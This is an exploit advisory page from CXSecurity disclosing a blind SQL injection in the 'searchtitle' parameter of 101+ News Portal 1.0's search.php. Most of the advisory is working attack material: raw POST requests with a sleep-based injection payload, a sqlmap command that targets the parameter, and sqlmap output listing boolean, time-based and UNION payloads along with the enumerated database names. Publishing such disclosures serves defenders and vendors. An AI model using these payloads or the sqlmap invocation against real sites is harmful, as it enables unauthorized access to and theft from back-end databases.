---
title: 101+ News Portal 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023030049
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-23
fetch_date: 2025-10-04T10:20:31.826809
---

# 101+ News Portal 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **101+ News Portal 1.0 SQL Injection** **2023.03.22**  Credit:  **[Abdulhakim Oner](https://cxsecurity.com/author/Abdulhakim%2BOner/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: 101+ News Portal - SQLi
# Date: 19/03/2023
# Exploit Author: Abdulhakim Öner
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/16067/best-online-news-portal-project-php-free-download.html
# Software Download: https://www.sourcecodester.com/sites/default/files/download/mayuri\_k/101news\_0.zip
# Version: 1.0
# Tested on: Windows, Linux
## Description
A Blind SQL injection vulnerability in the page (/101news/search.php) in 101+ News Portal allows remote unauthenticated attackers to execute remote arbitrary SQL commands through "searchtitle" parameter.
## Request PoC
```
POST /101news/search.php HTTP/1.1
Host: 192.168.1.101
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://192.168.1.101/101news/
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Cookie: PHPSESSID=o5fslt60dlojncb7jnft04lps9
searchtitle=232943'
```
This request causes an error. Adding "'%2b(select\*from(select(sleep(20)))a)%2b'" to the end of "searchtitle" parameter, the response to request was 200 status code with message of OK, but 20 seconds later, which indicates that our sleep 20 command works.
```
POST /101news/search.php HTTP/1.1
Host: 192.168.1.101
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://192.168.1.101/101news/
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Cookie: PHPSESSID=o5fslt60dlojncb7jnft04lps9
searchtitle=232943'%2b(select\*from(select(sleep(20)))a)%2b'
```
## Exploit with sqlmap
Save the request from burp to file
```
┌──(root㉿caesar)-[/home/kali/Workstation/multi]
└─# sqlmap -r sqli.txt -p 'searchtitle' --batch --dbs --level=3 --risk=2
---snip---
POST parameter 'searchtitle' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 114 HTTP(s) requests:
---
Parameter: searchtitle (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
Payload: searchtitle=232943' AND 3793=(SELECT (CASE WHEN (3793=3793) THEN 3793 ELSE (SELECT 6168 UNION SELECT 2808) END))-- KdPX
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: searchtitle=232943' AND (SELECT 1460 FROM (SELECT(SLEEP(5)))dqHc)-- zMGY
Type: UNION query
Title: Generic UNION query (NULL) - 8 columns
Payload: searchtitle=232943' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162787071,0x457444695056617478516b4b4f666e73744162466478444e5061624161514f78726c727777764c6b,0x716a6b6271)-- -
---
[18:01:02] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.0, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:01:02] [INFO] fetching database names
available databases [5]:
[\*] information\_schema
[\*] mysql
[\*] newsportal
[\*] performance\_schema
[\*] phpmyadmin
---snip---
```

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030049)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top